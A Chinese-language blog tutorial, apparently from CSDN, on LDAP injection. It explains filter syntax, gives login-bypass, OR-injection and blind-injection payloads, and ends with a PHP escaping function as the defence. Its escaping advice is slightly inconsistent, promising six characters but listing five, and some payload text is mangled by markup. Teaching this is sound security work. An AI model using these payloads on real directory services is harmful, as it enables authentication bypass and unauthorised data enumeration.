@@ -1,0 +1,78 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<h1><a id="_0"></a>含义：</h1>
+<p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。随着互联网的广泛使用，web应用的数量呈爆炸式的增长，而这些应用的资源和数据呈分布式存储于目录中。通常不同的应用会有专属于自己相关数据的目录，即专有目录，专有目录数量的增长导致了信息孤岛(一种不能与其他相关信息系统之间进行互操作或者说协调工作的信息系统)的出现，系统和资源的共享及管理变得日益困难。</p>
+<h1><a id="LDAP_4"></a>LDAP注入攻击</h1>
+<p>先看一下基础语法</p>
+<p>初始对象类定义：</p>
+<pre><code class="prism language-plain">objectclass: top
+objectclass: person
+</code></pre>
+<p>详细对象类定义：</p>
+<pre><code class="prism language-plain">objectclass: person
+objectclasses=( 2.5.6.6 NAME 'person' DESC 'Defines entries that generically represent people.' SUP 'top' STRUCTURAL MUST ( cn $ sn ) MAY ( userPassword $ telephoneNumber $ seeAlso $ description ) )
+1
+2
+</code></pre>
+<p>属性定义：</p>
+<pre><code class="prism language-plain">attributetypes=( 2.5.4.4 NAME ( 'sn' 'surName' ) DESC 'This is the X.500 surname attribute, which contains the family name of a person.' SUP 2.5.4.41 EQUALITY 2.5.13.2 ORDERING 2.5.13.3 SUBSTR 2.5.13.4 USAGE userApplications )
+</code></pre>
+<p>search语法:</p>
+<pre><code class="prism language-plain">attribute operator value
+attribute operator value search filter options:( "&amp;" or "|" (filter1) (filter2) (filter3) ...) ("!" (filter))
+</code></pre>
+<h1><a id="_30"></a>注入类型</h1>
+<ul><li>AND LDAP注入</li></ul>
+<pre><code class="prism language-plain">(&amp;(parameter1=value1)(parameter2=value2))
+</code></pre>
+<p>模拟登陆界面，v1为用户名v2为密码，在username字段后面进行注入，</p>
+<pre><code class="prism language-plain">payload: admin)(&amp;))
+result: (&amp;(username=admin)(&amp;))(password=123))
+</code></pre>
+<p>第一个式子永真，故成功绕过登录</p>
+<ul><li>OR LDAP注入</li></ul>
+<pre><code class="prism language-plain">(|(type=Rsc1)(type=Rsc2))
+</code></pre>
+<p>Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。</p>
+<pre><code class="prism language-plain">payload: Rsc1=printer)(uid=*)
+result: (|(type=printer)(uid=*))(type=scanner))
+</code></pre>
+<p>LDAP AND盲注<br/> 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p>
+<pre><code class="prism language-plain">(&amp;(objectclass=printer)(type=Epson*))
+</code></pre>
+<p>如果有可用的打印机，显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击”<em>)(objectClass=</em>))(&amp;(objectClass=void”，Web应用会构造如下查询：</p>
+<pre><code class="prism language-plain">(&amp;(objectclass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*))
+</code></pre>
+<p>仅对第一个过滤器进行处理，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。</p>
+<pre><code class="prism language-plain">(&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))
+(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*))
+</code></pre>
+<p>LDAP OR盲注<br/> 注入环境</p>
+<pre><code class="prism language-plain">(|(objectClass=void)(objectClass=void))(&amp;(objectClass=void)(type=Epson*))
+</code></pre>
+<p>如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息：</p>
+<pre><code class="prism language-plain">(|(objectClass=void)(objectClass=users))(&amp;(objectClass=void)(type=Epson*))
+(|(objectClass=void)(objectClass=resources))(&amp;(objectClass=void)(type=Epson*))
+</code></pre>
+<h1><a id="_77"></a>防范</h1>
+<p>只转义以下这6个字符就足以防止常见的ldap注入</p>
+<pre><code class="prism language-plain">* \ ( ) \x00
+</code></pre>
+<p>php防御代码</p>
+<pre><code class="prism language-plain">function ldapspecialchars($string) {
+    $sanitized=array('\\' =&gt; '\5c',
+                     '*' =&gt; '\2a',
+                     '(' =&gt; '\28',
+                     ')' =&gt; '\29',
+                     "\x00" =&gt; '\00');
+    return str_replace(array_keys($sanitized),array_values($sanitized),$string);
+}
+</code></pre>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
